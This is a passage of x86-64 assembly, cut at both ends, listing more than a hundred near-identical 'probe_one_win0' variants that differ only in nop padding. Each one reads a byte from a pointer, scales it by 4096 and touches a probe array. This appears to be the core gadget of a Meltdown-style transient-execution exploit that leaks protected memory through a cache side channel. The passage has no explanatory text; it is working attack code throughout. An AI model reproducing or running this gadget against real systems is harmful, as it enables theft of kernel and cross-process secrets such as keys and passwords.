	jmp	.Lprobe_one_win0_continue
## Variant 41
.Lprobe_one_win0_var41:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 42
.Lprobe_one_win0_var42:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 43
.Lprobe_one_win0_var43:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 44
.Lprobe_one_win0_var44:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 45
.Lprobe_one_win0_var45:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 46
.Lprobe_one_win0_var46:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 47
.Lprobe_one_win0_var47:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 48
.Lprobe_one_win0_var48:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 49
.Lprobe_one_win0_var49:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 50
.Lprobe_one_win0_var50:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 51
.Lprobe_one_win0_var51:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 52
.Lprobe_one_win0_var52:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 53
.Lprobe_one_win0_var53:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 54
.Lprobe_one_win0_var54:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 55
.Lprobe_one_win0_var55:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 56
.Lprobe_one_win0_var56:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 57
.Lprobe_one_win0_var57:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 58
.Lprobe_one_win0_var58:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 59
.Lprobe_one_win0_var59:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 60
.Lprobe_one_win0_var60:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 61
.Lprobe_one_win0_var61:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 62
.Lprobe_one_win0_var62:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 63
.Lprobe_one_win0_var63:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 64
.Lprobe_one_win0_var64:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 65
.Lprobe_one_win0_var65:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 66
.Lprobe_one_win0_var66:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 67
.Lprobe_one_win0_var67:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 68
.Lprobe_one_win0_var68:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 69
.Lprobe_one_win0_var69:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 70
.Lprobe_one_win0_var70:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 71
.Lprobe_one_win0_var71:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 72
.Lprobe_one_win0_var72:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 73
.Lprobe_one_win0_var73:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 74
.Lprobe_one_win0_var74:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 75
.Lprobe_one_win0_var75:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 76
.Lprobe_one_win0_var76:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 77
.Lprobe_one_win0_var77:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 78
.Lprobe_one_win0_var78:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 79
.Lprobe_one_win0_var79:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 80
.Lprobe_one_win0_var80:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 81
.Lprobe_one_win0_var81:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 82
.Lprobe_one_win0_var82:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 83
.Lprobe_one_win0_var83:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 84
.Lprobe_one_win0_var84:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 85
.Lprobe_one_win0_var85:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 86
.Lprobe_one_win0_var86:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 87
.Lprobe_one_win0_var87:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 88
.Lprobe_one_win0_var88:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 89
.Lprobe_one_win0_var89:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 90
.Lprobe_one_win0_var90:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 91
.Lprobe_one_win0_var91:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 92
.Lprobe_one_win0_var92:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 93
.Lprobe_one_win0_var93:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 94
.Lprobe_one_win0_var94:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 95
.Lprobe_one_win0_var95:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 96
.Lprobe_one_win0_var96:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 97
.Lprobe_one_win0_var97:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 98
.Lprobe_one_win0_var98:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 99
.Lprobe_one_win0_var99:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 100
.Lprobe_one_win0_var100:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 101
.Lprobe_one_win0_var101:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 102
.Lprobe_one_win0_var102:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 103
.Lprobe_one_win0_var103:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 104
.Lprobe_one_win0_var104:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 105
.Lprobe_one_win0_var105:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 106
.Lprobe_one_win0_var106:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 107
.Lprobe_one_win0_var107:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 108
.Lprobe_one_win0_var108:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 109
.Lprobe_one_win0_var109:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 110
.Lprobe_one_win0_var110:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 111
.Lprobe_one_win0_var111:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 112
.Lprobe_one_win0_var112:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 113
.Lprobe_one_win0_var113:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 114
.Lprobe_one_win0_var114:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 115
.Lprobe_one_win0_var115:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 116
.Lprobe_one_win0_var116:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 117
.Lprobe_one_win0_var117:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 118
.Lprobe_one_win0_var118:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 119
.Lprobe_one_win0_var119:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 120
.Lprobe_one_win0_var120:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 121
.Lprobe_one_win0_var121:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 122
.Lprobe_one_win0_var122:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 123
.Lprobe_one_win0_var123:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 124
.Lprobe_one_win0_var124:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 125
.Lprobe_one_win0_var125:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 126
.Lprobe_one_win0_var126:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 127
.Lprobe_one_win0_var127:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 128
.Lprobe_one_win0_var128:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 129
.Lprobe_one_win0_var129:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 130
.Lprobe_one_win0_var130:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 131
.Lprobe_one_win0_var131:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 132
.Lprobe_one_win0_var132:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 133
.Lprobe_one_win0_var133:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 134
.Lprobe_one_win0_var134:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 135
.Lprobe_one_win0_var135:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 136
.Lprobe_one_win0_var136:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 137
.Lprobe_one_win0_var137:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 138
.Lprobe_one_win0_var138:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 139
.Lprobe_one_win0_var139:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 140
.Lprobe_one_win0_var140:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 141
.Lprobe_one_win0_var141:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 142
.Lprobe_one_win0_var142:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 143
.Lprobe_one_win0_var143:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 144
.Lprobe_one_win0_var144:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 145
.Lprobe_one_win0_var145:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
